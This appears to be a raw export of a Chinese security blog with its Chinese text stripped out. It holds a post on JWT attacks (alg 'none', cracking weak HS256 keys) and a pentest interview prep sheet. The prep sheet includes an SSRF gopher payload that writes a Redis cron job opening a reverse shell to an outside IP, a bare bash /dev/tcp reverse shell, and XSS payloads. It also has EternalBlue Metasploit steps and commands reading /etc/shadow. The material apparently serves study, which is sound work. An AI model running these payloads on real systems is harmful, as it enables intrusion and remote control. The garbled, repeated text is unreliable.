id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h3><p><strong>JWT</strong><strong>Cookie</strong>loaclSrorageJWTCookieHTTP**<u>Header Authorization</u><strong>JWT</strong>POST**</p>\n<p></p>\n<p><code>Authorization</code><code>Bearer</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fetch(&#x27;api/user/1&#x27;, &#123;</span><br><span class=\"line\">  headers: &#123;</span><br><span class=\"line\">    &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151431006.png\"\n                        alt=\"-1684742819251\"\n                 ></p>\n<p>JWTJWTJWTHTTPHTTPS</p>\n<h3 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h3><ul>\n<li>none</li>\n<li>RS256HS256</li>\n<li> <strong></strong></li>\n<li></li>\n</ul>\n<p><strong>jwt</strong>ctf</p>\n<h4 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h4><p><strong>JWT</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.oe4qhTxvJB8nNAsFWJc7_m3UylVZzO3FwhkYuESAyUM</span><br></pre></td></tr></table></figure>\n\n<p>jwtencode <a class=\"link\"   href=\"https://jwt.io/\" >https://jwt.io/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151432089.png\"\n                        alt=\"-1684742810710\"\n                 ></p>\n<p><strong>falsetruefalsetruetokentoken</strong></p>\n<p><strong>keykeyHS256</strong></p>\n<p><strong></strong></p>\n<p><strong>key</strong></p>\n<p><strong>secret</strong></p>\n<p>  <a class=\"link\"   href=\"https://github.com/brendan-rius/c-jwt-cracker\" >https://github.com/brendan-rius/c-jwt-cracker<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>key54l7y</strong></p>\n<p><strong>jwt</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.hv55uOLPmX_C0Nx8qz-O2psgUq6V3EA0fgRqGFm5W6Q</span><br></pre></td></tr></table></figure>\n\n<p></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h1><h3 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h3><blockquote>\n<p>Json web token (JWT)JSON(RFC 7519)tokenSSOJWTtoken</p>\n</blockquote>\n<p>jwtsession</p>\n<h3 id=\"session\"><a href=\"#session\" class=\"headerlink\" title=\"session\"></a>session</h3><blockquote>\n<p>httphttpcookiesession</p>\n</blockquote>\n<p><strong>session</strong>session</p>\n<ul>\n<li><strong>Session</strong>session<strong></strong></li>\n<li><strong></strong></li>\n<li><strong>CSRF</strong>:  cookie <strong>cookie</strong></li>\n</ul>\n<h3 id=\"JWTSession\"><a href=\"#JWTSession\" class=\"headerlink\" title=\"JWTSession\"></a>JWTSession</h3><p><strong></strong><strong></strong></p>\n<p><strong></strong></p>\n<ul>\n<li><p><strong>SessionJWT</strong></p>\n</li>\n<li><p><strong>SessionJWT</strong></p>\n</li>\n<li><p><strong>Sessionsession idToken</strong></p>\n</li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151430767.png\"\n                        alt=\"-1684742759615\"\n                 ></p>\n<h3 id=\"Token--\"><a href=\"#Token--\" class=\"headerlink\" title=\"Token  \"></a>Token  </h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>Token</p>\n<blockquote>\n<p>HTTP</p>\n</blockquote>\n<p>SessionSession ID</p>\n<p></p>\n<ul>\n<li><strong>Sessions : </strong></li>\n<li><strong>Scalability : Session</strong></li>\n<li><strong>CORS : AJAX</strong></li>\n<li><strong>CSRF : CSRF</strong></li>\n</ul>\n<h4 id=\"Token\"><a href=\"#Token\" class=\"headerlink\" title=\"Token\"></a>Token</h4><ul>\n<li><strong>Tokens</strong></li>\n<li><strong>TokenCookieThe token, not a  cookie.TokenCookieCSRFtokenCookieCookie!</strong></li>\n<li><strong>tokentokentokentoken</strong></li>\n</ul>\n<h3 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h3><p>JSON Web Token</p>\n<ul>\n<li><strong>Authorization</strong> () : JWTJWTJWT</li>\n<li><strong>Information Exchange</strong> () : JSON Web  TokensJWTs&#x2F;</li>\n</ul>\n<h3 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h3><p>JSON Web Token(.)</p>\n<ul>\n<li><strong>Header</strong></li>\n<li><strong>Payload</strong></li>\n<li><strong>Signature</strong></li>\n</ul>\n<p></p>\n<h4 id=\"Header\"><a href=\"#Header\" class=\"headerlink\" title=\"Header\"></a>Header</h4><p>jwt</p>\n<ul>\n<li><strong></strong>jwt</li>\n<li><strong></strong> HMAC SHA256</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &#x27;typ&#x27;: &#x27;JWT&#x27;,</span><br><span class=\"line\">  &#x27;alg&#x27;: &#x27;HS256&#x27;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>base64</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p><strong>JWTalgnone</strong></p>\n<p><strong>JWTNonealg NoneJWTtokentoken</strong></p>\n</blockquote>\n<h4 id=\"Payload\"><a href=\"#Payload\" class=\"headerlink\" title=\"Payload\"></a>Payload</h4><p>payload<strong></strong></p>\n<ul>\n<li><strong>registered</strong> </li>\n<li><strong>public</strong> </li>\n<li><strong>private</strong> </li>\n</ul>\n<p><strong></strong></p>\n<ul>\n<li><strong>iss: jwt</strong></li>\n<li><strong>sub: jwt</strong></li>\n<li><strong>aud: jwt</strong></li>\n<li><strong>exp: jwt</strong></li>\n<li><strong>nbf: jwt.</strong></li>\n<li><strong>iat: jwt</strong></li>\n<li><strong>jti: jwttoken</strong></li>\n</ul>\n<p><strong></strong></p>\n<p><strong></strong><strong></strong></p>\n<p><strong></strong></p>\n<p><strong></strong>base64</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class=\"line\">  &quot;iss&quot;: &quot;http://localhost:8000/auth/login&quot;,</span><br><span class=\"line\">  &quot;iat&quot;: 1451888119,</span><br><span class=\"line\">  &quot;exp&quot;: 1454516119,</span><br><span class=\"line\">  &quot;nbf&quot;: 1451888119,</span><br><span class=\"line\">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class=\"line\">  &quot;admin&quot;: true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>base64jwt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>JWTpayloadheader</p>\n</blockquote>\n<h4 id=\"Signature\"><a href=\"#Signature\" class=\"headerlink\" title=\"Signature\"></a>Signature</h4><p><strong>3</strong></p>\n<ul>\n<li><strong>headerbase64</strong></li>\n<li><strong>payloadbase64</strong></li>\n<li><strong>secret</strong></li>\n</ul>\n<p>base64headerbase64payload<code>.</code>header<code>secret</code>jwt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// javascript</span><br><span class=\"line\">var encodedString = base64UrlEncode(header) + &#x27;.&#x27; + base64UrlEncode(payload);</span><br><span class=\"line\"></span><br><span class=\"line\">var signature = HMACSHA256(encodedString, &#x27;secret&#x27;); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p><strong>secretjwtsecretjwtjwtsecretjwt</strong></p>\n</blockquote>\n<h3 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h3><p><strong>JWT</strong><strong>Cookie</strong>loaclSrorageJWTCookieHTTP**<u>Header Authorization</u><strong>JWT</strong>POST**</p>\n<p></p>\n<p><code>Authorization</code><code>Bearer</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fetch(&#x27;api/user/1&#x27;, &#123;</span><br><span class=\"line\">  headers: &#123;</span><br><span class=\"line\">    &#x27;Authorization&#x27;: &#x27;Bearer &#x27; + token</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151431006.png\"\n                        alt=\"-1684742819251\"\n                 ></p>\n<p>JWTJWTJWTHTTPHTTPS</p>\n<h3 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h3><ul>\n<li>none</li>\n<li>RS256HS256</li>\n<li> <strong></strong></li>\n<li></li>\n</ul>\n<p><strong>jwt</strong>ctf</p>\n<h4 id=\"JWT\"><a href=\"#JWT\" class=\"headerlink\" title=\"JWT\"></a>JWT</h4><p><strong>JWT</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ImZhbHNlIn0.oe4qhTxvJB8nNAsFWJc7_m3UylVZzO3FwhkYuESAyUM</span><br></pre></td></tr></table></figure>\n\n<p>jwtencode <a class=\"link\"   href=\"https://jwt.io/\" >https://jwt.io/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151432089.png\"\n                        alt=\"-1684742810710\"\n                 ></p>\n<p><strong>falsetruefalsetruetokentoken</strong></p>\n<p><strong>keykeyHS256</strong></p>\n<p><strong></strong></p>\n<p><strong>key</strong></p>\n<p><strong>secret</strong></p>\n<p>  <a class=\"link\"   href=\"https://github.com/brendan-rius/c-jwt-cracker\" >https://github.com/brendan-rius/c-jwt-cracker<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><strong>key54l7y</strong></p>\n<p><strong>jwt</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6InRydWUifQ.hv55uOLPmX_C0Nx8qz-O2psgUq6V3EA0fgRqGFm5W6Q</span><br></pre></td></tr></table></figure>\n\n<p></p>\n"},{"title":"prepare","date":"2023-04-06T15:33:41.000Z","excerpt":"prepare","_content":"\n\n\n# prepare\n\n### \n\n\n\n\n\n\n\n### sql\n\n#### ****\n\nmysqlsqlserveroracleaccesssqlitepostgreSQL\n\n- mysql:3306 \n- sqlserver:1433 \n- orecal:1521 \n- PostgreSQL:5432 \n- db2:50000\n\n- MongoDB:27017 \n- redis:6379 \n- memcached:11211\n\n#### **SQL**\n\n \n \n\n\n\nGETPOSTCOOKIEHTTP\n\n\n\n#### **SQL**\n\n\n\n-  \n-  \n-  \n- \n\n\n\n\n\n-  \n-  \n- WAF\n\n\n\n#### sqlgetshell\n\n- SQL\n- web\n- \n- secure_file_privsecure_file_privload dumpfileinto outfileload_file()\n\n\n\n#### \n\n- \n- \n-   /**/\n-  %20 %09 %0a\n- \n- \n- join\n- like\n\n\n\n### xss\n\n#### \n\nxssjavascriptjs\n\n#### xss\n\n\n \n scriptjs\n\n\n\n#### xss\n\n##### DOMXSS\n\njs\n\n##### XSS\n\njs\n\n##### XSS\n\njsjs\n\n#### xss\n\n- COOKIE\n- DOM\n- \n- xss\n- \n\n#### xss\n\n- \n- \n- htmlHTMLEncodejavascriptJavaScriptEncodejavascriptEncodedata\n- httponlytrue\n\n\n\n#### \n\n- \n\n- script\n  \n\n  ```\n  <input  value='123' onclick='alert()'>\n  ```\n\n- \n\n  ```\n  <a src=javascript:alert()>123</a>\n  ```\n\n  \n\n### ssrf\n\n#### \n\nServer Side Request Forgery, SSRFSSRF\n\n#### \n\nSSRFFile\n\nSSRF\n\n\n\n#### \n\nSSRF\n\ncurl, dictRedisfilegopherShellPayload\n\n```\ncurl -vvv 'dict://127.0.0.1:6379/info'\n \ncurl -vvv 'file:///etc/passwd'\n \n# * : $\n \ncurl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'\n```\n\n\n\n#### \n\nIP192.168.0.1IP\n\n> - 80300.0250.0.1\n>\n> - 160xC0.0xA8.0.1\n>\n> - 103232235521\n>\n> - 160xC0A80001\n>\n> - 1.1.278 / 1.1.755\n>\n> - 1.278 / 1.755 / 3.14159267\n>\n> - 0.0.0.0IP\n>\n> - `xip.io` IP\n>\n>   192.168.0.1.xip.io192.168.0.1\n\n\n\n#### \n\n> - \n> - \n> - \n> - \n> - DNS RebindingDNSHost\n\n1. GET\n2. httphttps\n3. CRLF\n4. setInstanceFollowRedirectsfalse302\n5. urlipv4   \n   1. ip\n   2. **ipurlip**DNS Rebinding\n\n\n\n### \n\n#### \n\n\n\n    \n    1Web\n    2\n    3\n\n\n![-1685330394483](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151439718.png)\n\n\n\n#### \n\n1.\n\nJS\n\n1\n2BurpSuit.\n2.\n1%00\n\nCorPHP,0x00xxx.php%00.jpg.jpg0x00xxx.php\nURL%00ASCII0ASCII0\n\n\n\n#### \n\n##### .htaccess\n\n> htaccess [apache](https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020)apache\n\n.htaccessSetHandler application/x-http-phpphpphpPHP\n\n\n\n##### .user.ini\n\nphp.iniphpweb.user.ini.htaccess.user.iniphp.ini\n\n```\nauto_prepend_file = <filename>         //\nauto_append_file = <filename>          //\n```\n\n.user.ini\n\n##### js\n\n\n\n##### \n\nphtml php3 php4 php5 Php php () php.pphphp\n\n##### content-type,GIF89a\n\n\n\n### csrf\n\n#### \n\n\n\nCSRFCookieCSRF\n\n\n\n#### \n\n1URL\n\n2Synchronizer Token,token\n\n3Referer HeaderURL\n\n4\n\n520\n\n6\n\n7postget\n\n8 XSS\n\n9\n\n10CSPContent-Security-Policy\n\n\n\n#### XXE\n\nXXEXML External Entity InjectionXMLXXEXML\n\nXMLXML\n\n  DOS\n\n\n\n### sqlmap\n\n#### \n\n-h                                           \n\n-hh                                         \n\n--version                                \n\n-v                                           0-6  1\n-u                                          url\n\n-d                                          \n\n-l                                           burp\n\n-r                                           http\n\n-g                                          google dorkurl\n\n-c                                          INI\n\n1.    --purge      --purge \n\n2.    --tables      \n\n3.    --dbs         \n\n4.    --current-db    \n\n5.    --current-user  \n\n6.    --is-dba   \n\n7.    --batch      \n\n8.    --search   -D -T -C CTD\n\n9.    --threads 10  sqlmap10\n\n10.    --level 3        sqlmapGETPOST--level2HTTP Cookie\n                                  3User-AgentHTTP Referer5\n11.    --risk 3           0-31risk\n\n12.    -v   (0-6)\n         0Python\n         1\n         2\n         3\n         4HTTP\n         5HTTP\n         6HTTP\n\n13.    --privileges  \n\n14.    --tamper xx.py,cc.py   tamperpy\n\n15.    --method \"POST\" --data \"page=1&id=2\"   POST\n\n16.    --threads number \n\n17.    --referer  \"\"  referer\n\n18.    --user-agent \"\"     user-agent\n\n19.    --proxy    \n\n1.url\n\n```\nsqlmap -u \"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1\"\n```\n\n2.url\n\n```\nsqlmap -m 1.txt\n```\n\n3.HTTP\n\n```\nsqlmap -r  url.txt\n```\n\n4.google\n\n```\nsqlmap -g \"inurl:\\\".php?id=1\\\"\"\n```\n\n5.burp\n\n```\nsqlmap -l    burp.txt\n```\n\n-sqlmap\n\n1.GET\n\n```\nsqlmap -u \"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1\"\n```\n\n2.POST\n\n```\nsqlmap -u \"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1\"  --data=\"id=1\"\n```\n\n\n\n1.   sqlmap -u  \"http://www.xx.com?id=x\"    \n\n2.   --dbs         \n\n3.   --current-db    \n\n4.   --tables -D \"db_name\"   -D\n\n5.   --columns  -T \"table_name\" -D \"db_name\"  \n\n6.   --dump -C \"columns_name\" -T \"table_name\" -D \"db_name\"  \n\nPOST\n\n    1http:// www.xxx.com /login.asp\n    2brup\n    3\n    4burppost\n    5.txt\n    6sqlmap\n\nsqlmap -r okay.txt  -p  username\n\n// -r(5)-ppostname\n\n\n\n### AWVS\n\n#### \n\nAcunetix Web Vulnerability ScannerAWVSWebHTTP/HTTPSWebWeb\n\nAWVSSQLXSSWeb\n\n\n\n#### \n\n- AjaxWeb2.0\n\n- SQL\n\n- HTPP EditorHTTP Fuzzer\n\n- web\n\n- CAPTHCATwo Factor\n\n- VISA PCI\n\n- \n\n- web\n\n- AcunetixflashSOAPAJAX\n\n- web\n\n- \n\n\n\n#### \n\n- robots.txtAWVS\n\n- AWVS WVS3 \n\n- AWVSAlerts Node()\n\n- \n\n\n\n#### \n\n5DashboardTargetsVulnerabilitiesScansReports\n\n- Dashboard\n- Targets\n- Vulnerabilities\n- ScansTarget\n- Reports\n\n8UsersScan TypesNetwork ScannerIssue TrackersEmail SettingsEnginesExcluded HoursProxy Settings\n\n- Users\n- Scan TypesSQL \n- Network Scanner\n- Issue TrackersgithubgitlabJIRA\n- Email Settings\n- Engines\n- Excluded Hours\n- Proxy Settings\n\n\n\n### APPSCAN\n\n#### \n\nAppScanIBMwebWindowsWeb\n\n#### \n\n1web\n\n2HTTP Request\n\n3 Response \n\n\n\n### wireshark\n\n#### \n\n1\n 2\n 3\n\n#### \n\n``\n\n\n\n#### \n\n#### \n\ntcpTCP\n httpHTTP\n icmpICMP\n\n####  ip\n\n```\n ip.src ==192.168.1.104 192.168.1.104\n ip.dst==192.168.1.104, 192.168.1.104\n ip.addr == 192.168.1.104 IPIP192.168.1.104\n```\n\n#### \n\n```\ntcp.port ==80,  80\ntcp.srcport == 80,  TCP80\ntcp.dstport == 80TCP80\n```\n\n####  Http\n\n```\nhttp.request.method==GET, HTTP GET\n```\n\n####  and/or/not\n\nand/orIP192.168.1.104ICMP`ip.addr == 192.168.1.104 and icmp`\n\n\n\n### nmap\n\n| () |                                                          |\n| -------------------- | ------------------------------------------------------------ |\n| -sT                  | TCP connect() |\n| -sS                  | Root |\n| -sF  -sN             | FINXmas TreeNull                   |\n| -sP                  | pingNmappingNmap |\n| -sU                  | UDPUDP                                 |\n| -sA                  |                  |\n| -sV                  |                                              |\n| -Pn                  | pingping |\n| -v                   |                                        |\n| -h                   |                                  |\n| -p                   | 1-6553514331352280                   |\n| -O                   |                                |\n| -A                   |                            |\n| -oN/-oX/-oG          | XMLgrepable            |\n| -T4                  | TCP10ms                          |\n| -iL                  | -iL C:\\ip.txt                          |\n\n**1**\n\nnmap ip\n\n```\nnmap 192.168.0.101\n```\n\n**2**\n\nnmap ip1 ip2 \n\n```\nnmap 192.168.0.101 192.168.0.110\n```\n\n**3**\n\nnmap xxx.xxx.xxx.xxx-xxx\n\n```\nnmap 192.168.0.100-110\n```\n\n**4**\n\nnamp xxx.xxx.xxx.xxx/xx\n\n```\nnmap 192.168.0.1/24\n```\n\n**5**\n\nnmap -iL <File path>\n\n```\nnmap -iL /root/target.txt\n```\n\n**6**\n\nnmap ip -exclude ip\n\n```\nnmap 192.168.0.100-110 -exclude 192.168.0.103\n   nmap 192.168.0.1/24 -exclude 192.168.0.103 \n```\n\n**7**\n\nnmap ip -p 123\n\n```\n:nmap 192.168.0.101 -p 80,8080,3306,3389\n```\n\n**8C**\n\nnmap -sP ip\n\n```\nnmap -sP 192.168.0.1/24\n```\n\n**9**\n\nnmap -O ip\n\n```\nnmap -O 192.168.0.101\n```\n\n**10**\n\nnmap -sS -p (,) -v ip\n\n```\nnmap -sS -p 1-65535 192.168.0.101\n```\n\n\n\n### MSF\n\n#### \n\nMetasploitMSF\n\n\n\n****\n\n\n\n#### \n\n : `search ms17_010`\n\n1\n\n`use auxiliary/scanner/smb/smb_ms17_010`\n\n`options` \n\n`set rhosts 192.168.174.129`\n\n445nmapwindows445`set rport `\n\n`run``exploit` \n\n\n\n2\n\n\n\n`use exploit/windows/smb/ms17_010_eternalblue`\n\n`options` \n\n`set RHOSTS 192.168.174.129`\n\n`set RPORT 445`\n\npayload`set payload windows/x64/meterpreter/reverse_tcp`\n\n`set LHOST 192.168.174.192`\n\n`run``exploit` \n\n\n\n\n\n### Linux\n\n**netstat**\n\n\n\nnetstat []\n\n\n\n- -a\n- -n\n- -p\n- -tTCP\n- -uUDP\n- -r\n\n\n\n**network**\n\n\n\nnetworkservice network restart\n\n\n\n**chmod**\n\n\n\nLinux\n\n-  \n- d \n- s socket\n- l \n- p \n- c \n- b \n\n`uname -a`: Linux!(,Linux)\n\n\n\n- cat /etc/issue: ,(PS:)\n- cat /etc/*-release: (,,*ls /etc | grep \"release\"\"!)\n- cat /proc/version: ,gcc\n- cat /proc/sys/kernel/version: ,uname -v(/proc/sys/kernelLinux!!)\n\n\n\n\n\n\n    ps: \n        ps -elf: (-l)UID,PPIP,CSTIME(-f)(-e)\n        ps aux: (u)(a)(x)\n    top: Windows\n\n`cat /etc/passwd`: \n\n`cat /etc/shadow`: ,!\n\n`cat /etc/sudoers`:    \n\n`ifconfig -a`: \n\n`hostname`: \n\n\n\n#### shell\n\n```\nbash -i >& /dev/tcp/192.168.0.4/7777 0>&1\n```\n\n\n\n### OSI\n\n![-1685330434325](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440002.png)****OSI\n\n****,\n\n****\n\n****\n\n**IP**/\n\n****\n\n****\n\n\n\n### TCP/IP\n\n#### ![-1685330444867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440451.png)\n\nTCP/IPOSI\n\nTCP/IPOSI\n\nTCP/IPUDP\n\n\n\n\n\n### xsscsrfssrf\n\n****\n XSSCSRF,SSRFWeb\n\n****\n XSShtml\n\nCSRF()httpreferCookie  \n\nSSRF(URLRUL","source":"_posts/prepare.md","raw":"---\ntitle: prepare\ndate: 2023-04-06 23:33:41\nexcerpt: prepare\ncategories: \n---\n\n\n\n# prepare\n\n### \n\n\n\n\n\n\n\n### sql\n\n#### ****\n\nmysqlsqlserveroracleaccesssqlitepostgreSQL\n\n- mysql:3306 \n- sqlserver:1433 \n- orecal:1521 \n- PostgreSQL:5432 \n- db2:50000\n\n- MongoDB:27017 \n- redis:6379 \n- memcached:11211\n\n#### **SQL**\n\n \n \n\n\n\nGETPOSTCOOKIEHTTP\n\n\n\n#### **SQL**\n\n\n\n-  \n-  \n-  \n- \n\n\n\n\n\n-  \n-  \n- WAF\n\n\n\n#### sqlgetshell\n\n- SQL\n- web\n- \n- secure_file_privsecure_file_privload dumpfileinto outfileload_file()\n\n\n\n#### \n\n- \n- \n-   /**/\n-  %20 %09 %0a\n- \n- \n- join\n- like\n\n\n\n### xss\n\n#### \n\nxssjavascriptjs\n\n#### xss\n\n\n \n scriptjs\n\n\n\n#### xss\n\n##### DOMXSS\n\njs\n\n##### XSS\n\njs\n\n##### XSS\n\njsjs\n\n#### xss\n\n- COOKIE\n- DOM\n- \n- xss\n- \n\n#### xss\n\n- \n- \n- htmlHTMLEncodejavascriptJavaScriptEncodejavascriptEncodedata\n- httponlytrue\n\n\n\n#### \n\n- \n\n- script\n  \n\n  ```\n  <input  value='123' onclick='alert()'>\n  ```\n\n- \n\n  ```\n  <a src=javascript:alert()>123</a>\n  ```\n\n  \n\n### ssrf\n\n#### \n\nServer Side Request Forgery, SSRFSSRF\n\n#### \n\nSSRFFile\n\nSSRF\n\n\n\n#### \n\nSSRF\n\ncurl, dictRedisfilegopherShellPayload\n\n```\ncurl -vvv 'dict://127.0.0.1:6379/info'\n \ncurl -vvv 'file:///etc/passwd'\n \n# * : $\n \ncurl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/103.21.140.84/6789 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'\n```\n\n\n\n#### \n\nIP192.168.0.1IP\n\n> - 